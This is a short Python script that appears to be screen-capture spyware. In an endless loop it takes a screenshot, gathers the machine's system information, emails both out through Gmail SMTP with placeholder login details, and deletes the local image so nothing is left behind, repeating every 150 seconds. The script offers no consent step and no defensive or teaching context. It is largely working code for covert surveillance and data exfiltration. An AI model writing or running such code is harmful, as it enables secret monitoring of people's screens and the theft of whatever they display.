from time import sleep
from os import remove, path
import platform
import smtplib
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pyautogui import screenshot

#-------mail_info------------#
platform_info=str(platform.uname())

while True:                         
    def Send(ImgFileName):
        
        screenshot("scr.jpg")

        img_data = open(ImgFileName, 'rb').read()
        msg = MIMEMultipart()
        msg['Subject'] = 'INFO'
        msg['From'] = 'from@gmail.com'
        msg['To'] = 'to@gmail.com'
        
        text = MIMEText(platform_info)
        msg.attach(text)
        image = MIMEImage(img_data, name=path.basename(ImgFileName))
        msg.attach(image)

        s = smtplib.SMTP("smtp.gmail.com","587")
        s.ehlo()
        s.starttls()
        s.ehlo()
        s.login("your_login@gmail.com", "pass")
        s.sendmail("from@gmail.com", 'to@gmail', msg.as_string() )
        remove("scr.jpg")
        s.quit()
        sleep(150)#seconds
    Send("scr.jpg")
